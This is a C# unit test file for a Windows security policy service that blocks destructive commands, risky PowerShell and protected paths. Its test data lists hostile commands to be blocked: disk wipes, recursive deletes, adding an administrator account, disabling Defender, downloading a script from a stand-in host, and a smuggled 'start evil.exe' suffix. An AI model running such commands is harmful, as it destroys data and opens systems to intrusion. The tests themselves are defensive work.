using Coclico.Services;
using Xunit;

namespace Coclico.Tests;

public sealed class SecurityPolicyTests
{
    [Theory]
    [InlineData("format c:")]
    [InlineData("FORMAT /FS:NTFS C:")]
    [InlineData("rd /s /q C:\\")]
    [InlineData("rmdir /S /Q C:\\Users")]
    [InlineData("del /f /s /q *")]
    [InlineData("rm -rf /")]
    [InlineData("diskpart")]
    [InlineData("bcdedit /set {default} bootmenupolicy legacy")]
    [InlineData("reg delete hklm\\software\\x")]
    [InlineData("net user administrator p@ss")]
    [InlineData("icacls C:\\ /grant Everyone:F")]
    [InlineData("takeown /f C:\\windows")]
    [InlineData("sc delete wuauserv")]
    [InlineData("sc stop bits")]
    public void IsCommandBlocked_BlocksDestructivePatterns(string command)
    {
        Assert.True(new SecurityPolicyService().IsCommandBlocked(command.ToLowerInvariant()));
    }

    [Theory]
    [InlineData("notepad.exe")]
    [InlineData("cleanmgr /verylowdisk")]
    [InlineData("ping 1.1.1.1")]
    [InlineData("msiexec.exe /x {11111111-2222-3333-4444-555555555555}")]
    public void IsCommandBlocked_AllowsNormalCommands(string command)
    {
        Assert.False(new SecurityPolicyService().IsCommandBlocked(command.ToLowerInvariant()));
    }

    [Theory]
    [InlineData("invoke-expression 'malicious'")]
    [InlineData("powershell -encodedcommand AAAA")]
    [InlineData("Invoke-WebRequest http://evil.example/x.ps1")]
    [InlineData("Remove-Item -Recurse C:\\Users")]
    [InlineData("Set-MpPreference -DisableRealtimeMonitoring $true")]
    public void IsPowerShellBlocked_BlocksDangerousPatterns(string script)
    {
        Assert.True(new SecurityPolicyService().IsPowerShellBlocked(script.ToLowerInvariant()));
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\cmd.exe")]
    [InlineData(@"c:\program files\app\app.exe")]
    [InlineData(@"c:\program files (x86)\app\app.exe")]
    [InlineData(@"C:\ProgramData\Microsoft\Windows\Start Menu\lnk.lnk")]
    [InlineData(@"C:\System Volume Information\tracking.log")]
    [InlineData(@"D:\$RECYCLE.BIN\x")]
    [InlineData(@"C:\EFI\boot\bootx64.efi")]
    public void IsProtectedPath_ProtectsSystemTrees(string path)
    {
        Assert.True(new SecurityPolicyService().IsProtectedPath(path.ToLowerInvariant()));
    }

    [Theory]
    [InlineData(@"C:\Users\x\AppData\Local\Temp\cleanup.exe")]
    [InlineData(@"D:\Games\game.exe")]
    public void IsProtectedPath_AllowsUserPaths(string path)
    {
        Assert.False(new SecurityPolicyService().IsProtectedPath(path.ToLowerInvariant()));
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public void IsApplicationAllowed_EmptyName_ReturnsFalse(string? appName)
    {
        Assert.False(new SecurityPolicyService().IsApplicationAllowed(appName!, out _));
    }

    [Fact]
    public void IsApplicationAllowed_BlockedCommand_ReturnsFalse()
    {
        Assert.False(new SecurityPolicyService().IsApplicationAllowed("format.com", out _));
    }

    [Theory]
    [InlineData("ms-settings:", false)]
    [InlineData("ms-settings:appsfeatures", true)]
    [InlineData("ms-settings:privacy-microphone", true)]
    [InlineData("ms-settings:appsfeatures; start evil.exe", false)]
    [InlineData("ms-settings:apps features", false)]
    public void IsApplicationAllowed_SettingsUri_ValidatedBySuffix(string target, bool expected)
    {
        Assert.Equal(expected, new SecurityPolicyService().IsApplicationAllowed(target, out _));
    }

    [Theory]
    [InlineData("notepad")]
    [InlineData("NOTEPAD.EXE")]
    [InlineData("calc")]
    [InlineData("taskmgr")]
    [InlineData("powershell")]
    [InlineData("cleanmgr.exe")]
    public void IsApplicationAllowed_StandardSystemApps_AreAllowed(string appName)
    {
        Assert.True(new SecurityPolicyService().IsApplicationAllowed(appName, out _));
    }

    [Fact]
    public void IsApplicationAllowed_ExeOutsideApprovedLocations_IsRefused()
    {
        string exe = Path.Combine(Path.GetTempPath(), "untrusted_policy_test.exe");
        File.WriteAllText(exe, "stub");

        try
        {
            Assert.False(new SecurityPolicyService().IsApplicationAllowed(exe, out _));
        }
        finally
        {
            File.Delete(exe);
        }
    }

    [Fact]
    public void IsApplicationAllowed_NonExeFile_IsRefused()
    {
        string file = Path.Combine(Path.GetTempPath(), "policy_test.txt");
        File.WriteAllText(file, "data");

        try
        {
            Assert.False(new SecurityPolicyService().IsApplicationAllowed(file, out _));
        }
        finally
        {
            File.Delete(file);
        }
    }

    [Theory]
    [InlineData("randomappthatdoesnotexist")]
    [InlineData("C:\\does\\not\\exist.exe")]
    public void IsApplicationAllowed_UnknownName_IsRefused(string appName)
    {
        Assert.False(new SecurityPolicyService().IsApplicationAllowed(appName, out _));
    }
}
